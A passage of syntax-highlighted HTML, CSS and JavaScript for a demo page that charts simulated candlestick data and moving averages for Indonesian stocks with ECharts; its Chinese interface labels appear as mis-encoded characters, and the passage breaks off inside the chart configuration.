            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
        }
        
        <span class="hljs-selector-class">.info-card</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
        }
        
        <span class="hljs-selector-class">.info-card</span> <span class="hljs-selector-tag">h3</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4fc3f7</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.1rem</span>;
        }
        
        <span class="hljs-selector-class">.price</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.8rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4caf50</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;
        }
        
        <span class="hljs-selector-class">.change</span><span class="hljs-selector-class">.positive</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4caf50</span>;
        }
        
        <span class="hljs-selector-class">.change</span><span class="hljs-selector-class">.negative</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#f44336</span>;
        }
        
        <span class="hljs-selector-class">.stats</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">justify-content</span>: space-between;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
        }
        
        <span class="hljs-selector-class">.stat-item</span> {
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-selector-class">.stat-value</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }
        
        <span class="hljs-selector-class">.stat-label</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.8rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
        }
        
        <span class="hljs-selector-id">#chart</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">600px</span>;
        }
        
        <span class="hljs-selector-class">.time-info</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-selector-class">.indicator-selector</span> {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span> <span class="hljs-number">0</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btns</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-wrap</span>: wrap;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btn</span> {
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">12px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1a2a3a</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#2a4d7a</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#bbdefb</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.2s</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btn</span><span class="hljs-selector-class">.active</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1565c0</span>;
            <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#4fc3f7</span>;
        }
        
        <span class="hljs-selector-tag">footer</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">1024px</span>) {
            <span class="hljs-selector-class">.content</span> {
                <span class="hljs-attribute">flex-direction</span>: column;
            }
            
            <span class="hljs-selector-class">.panel</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å°åº¦å°¼è¥¿äºšè‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subtitle"</span>&gt;</span>å®æ—¶å±•ç¤ºå°å°¼é›…åŠ è¾¾ç»¼åˆæŒ‡æ•°(JCI)åŠä¸»è¦è‚¡ç¥¨çš„å¤šå‘¨æœŸKçº¿å›¾<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chart-container"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-info"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"timeInfo"</span>&gt;</span>æ•°æ®æ›´æ–°æ—¶é—´: --<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"panel"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stock-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"stockSelect"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"JCI"</span>&gt;</span>é›…åŠ è¾¾ç»¼åˆæŒ‡æ•° (JCI)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"BBCA"</span>&gt;</span>ä¸­äºšé“¶è¡Œ (BBCA)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"BBRI"</span>&gt;</span>å°å°¼äººæ°‘é“¶è¡Œ (BBRI)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"TLKM"</span>&gt;</span>å°å°¼ç”µä¿¡ (TLKM)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"UNVR"</span>&gt;</span>è”åˆåˆ©åå°å°¼ (UNVR)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1m"</span>&gt;</span>1åˆ†é’Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"5m"</span>&gt;</span>5åˆ†é’Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"15m"</span>&gt;</span>15åˆ†é’Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"30m"</span>&gt;</span>30åˆ†é’Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn active"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1h"</span>&gt;</span>1å°æ—¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1d"</span>&gt;</span>æ—¥çº¿<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1w"</span>&gt;</span>å‘¨çº¿<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1mo"</span>&gt;</span>æœˆçº¿<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info-card"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å½“å‰ä»·æ ¼<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"price"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"currentPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"change"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"priceChange"</span>&gt;</span>-- (--%)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"openPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>å¼€ç›˜<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"highPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>æœ€é«˜<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"lowPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>æœ€ä½<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æŠ€æœ¯æŒ‡æ ‡<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btns"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn active"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"ma"</span>&gt;</span>MA<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"ema"</span>&gt;</span>EMA<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"macd"</span>&gt;</span>MACD<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"rsi"</span>&gt;</span>RSI<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"boll"</span>&gt;</span>å¸ƒæ—å¸¦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info-card"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å¸‚åœºä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å°å°¼äº¤æ˜“æ‰€äº¤æ˜“æ—¶é—´: 09:30-12:00, 13:30-16:00 (UTC+7)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è´§å¸: å°å°¼ç›¾ (IDR)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä¸»è¦æ¿å—: é‡‘èã€èµ„æºã€ç”µä¿¡<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ•°æ®æ¥æº: StockTV API | æœ¬é¡µé¢ä»…ç”¨äºæ¼”ç¤ºç›®çš„ï¼Œä¸æ„æˆæŠ•èµ„å»ºè®®<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// åˆå§‹åŒ–EChartså®ä¾‹</span>
        <span class="hljs-keyword">const</span> chartDom = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>);
        <span class="hljs-keyword">const</span> myChart = echarts.<span class="hljs-title function_">init</span>(chartDom);
        
        <span class="hljs-comment">// å½“å‰é€‰ä¸­çš„æ—¶é—´æ¡†æ¶å’Œè‚¡ç¥¨</span>
        <span class="hljs-keyword">let</span> currentInterval = <span class="hljs-string">'1h'</span>;
        <span class="hljs-keyword">let</span> currentStock = <span class="hljs-string">'JCI'</span>;
        <span class="hljs-keyword">let</span> currentIndicator = <span class="hljs-string">'ma'</span>;
        
        <span class="hljs-comment">// æ¨¡æ‹ŸKçº¿æ•°æ®ç”Ÿæˆå‡½æ•°ï¼ˆå®é™…åº”ç”¨ä¸­åº”ä»APIè·å–ï¼‰</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateKLineData</span>(<span class="hljs-params">interval, count = <span class="hljs-number">100</span></span>) {
            <span class="hljs-keyword">const</span> basePrice = <span class="hljs-number">7000</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000</span>;
            <span class="hljs-keyword">const</span> data = [];
            <span class="hljs-keyword">let</span> timestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
            
            <span class="hljs-comment">// æ ¹æ®æ—¶é—´é—´éš”è®¾ç½®æ—¶é—´æ­¥é•¿ï¼ˆæ¯«ç§’ï¼‰</span>
            <span class="hljs-keyword">const</span> intervalMs = {
                <span class="hljs-string">'1m'</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'5m'</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'15m'</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'30m'</span>: <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1h'</span>: <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1d'</span>: <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1w'</span>: <span class="hljs-number">7</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1mo'</span>: <span class="hljs-number">30</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>
            }[interval] || <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;
            
            <span class="hljs-comment">// ç”Ÿæˆå€’åºæ•°æ®ï¼ˆæœ€æ–°çš„æ•°æ®åœ¨æœ€åï¼‰</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = count - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
                <span class="hljs-keyword">const</span> time = timestamp - i * intervalMs;
                <span class="hljs-keyword">const</span> open = i === count - <span class="hljs-number">1</span> ? basePrice : data[data.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>];
                <span class="hljs-keyword">const</span> volatility = <span class="hljs-number">10</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">20</span>;
                <span class="hljs-keyword">const</span> change = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * volatility;
                <span class="hljs-keyword">const</span> close = open + change;
                <span class="hljs-keyword">const</span> high = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(open, close) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * volatility / <span class="hljs-number">2</span>;
                <span class="hljs-keyword">const</span> low = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(open, close) - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * volatility / <span class="hljs-number">2</span>;
                <span class="hljs-keyword">const</span> volume = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000000</span>) + <span class="hljs-number">100000</span>;
                
                data.<span class="hljs-title function_">push</span>([
                    echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'yyyy-MM-dd HH:mm'</span>, time),
                    open,
                    close,
                    low,
                    high,
                    volume
                ]);
            }
            
            <span class="hljs-keyword">return</span> data;
        }
        
        <span class="hljs-comment">// è®¡ç®—ç§»åŠ¨å¹³å‡çº¿</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateMA</span>(<span class="hljs-params">dayCount, data</span>) {
            <span class="hljs-keyword">const</span> result = [];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">if</span> (i &lt; dayCount) {
                    result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'-'</span>);
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; dayCount; j++) {
                    sum += data[i - j][<span class="hljs-number">2</span>]; <span class="hljs-comment">// æ”¶ç›˜ä»·</span>
                }
                result.<span class="hljs-title function_">push</span>(+(sum / dayCount).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>));
            }
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-comment">// æ›´æ–°å›¾è¡¨</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateChart</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> klineData = <span class="hljs-title function_">generateKLineData</span>(currentInterval);
            
            <span class="hljs-comment">// æ›´æ–°ä¿¡æ¯é¢æ¿</span>
            <span class="hljs-keyword">const</span> latestData = klineData[klineData.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'currentPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">2</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'openPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">1</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'highPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">4</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'lowPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">3</span>].<span class="hljs-title function_">toLocaleString</span>();
            
            <span class="hljs-keyword">const</span> change = latestData[<span class="hljs-number">2</span>] - latestData[<span class="hljs-number">1</span>];
            <span class="hljs-keyword">const</span> changePercent = (change / latestData[<span class="hljs-number">1</span>] * <span class="hljs-number">100</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);
            <span class="hljs-keyword">const</span> changeElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'priceChange'</span>);
            changeElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">${change &gt;= <span class="hljs-number">0</span> ? <span class="hljs-string">'+'</span> : <span class="hljs-string">''</span>}</span><span class="hljs-subst">${change.toFixed(<span class="hljs-number">2</span>)}</span> (<span class="hljs-subst">${changePercent}</span>%)`</span>;
            changeElement.<span class="hljs-property">className</span> = <span class="hljs-string">`change <span class="hljs-subst">${change &gt;= <span class="hljs-number">0</span> ? <span class="hljs-string">'positive'</span> : <span class="hljs-string">'negative'</span>}</span>`</span>;
            
            <span class="hljs-comment">// æ›´æ–°æ—¶é—´ä¿¡æ¯</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'timeInfo'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`æ•°æ®æ›´æ–°æ—¶é—´: <span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toLocaleString()}</span>`</span>;
            
            <span class="hljs-comment">// è®¡ç®—æŠ€æœ¯æŒ‡æ ‡</span>
            <span class="hljs-keyword">const</span> ma5 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">5</span>, klineData);
            <span class="hljs-keyword">const</span> ma10 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">10</span>, klineData);
            <span class="hljs-keyword">const</span> ma20 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">20</span>, klineData);
            
            <span class="hljs-comment">// é…ç½®å›¾è¡¨é€‰é¡¹</span>
            <span class="hljs-keyword">const</span> option = {
                <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span>,
                <span class="hljs-attr">animation</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-attr">legend</span>: {
                    <span class="hljs-attr">top</span>: <span class="hljs-number">10</span>,
                    <span class="hljs-attr">left</span>: <span class="hljs-string">'center'</span>,
                    <span class="hljs-attr">data</span>: [currentStock, <span class="hljs-string">'MA5'</span>, <span class="hljs-string">'MA10'</span>, <span class="hljs-string">'MA20'</span>],
                    <span class="hljs-attr">textStyle</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#e0e0e0'</span>
                    }
                },
                <span class="hljs-attr">tooltip</span>: {
                    <span class="hljs-attr">trigger</span>: <span class="hljs-string">'axis'</span>,
                    <span class="hljs-attr">axisPointer</span>: {
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'cross'</span>
                    },
                    <span class="hljs-attr">borderWidth</span>: <span class="hljs-number">1</span>,
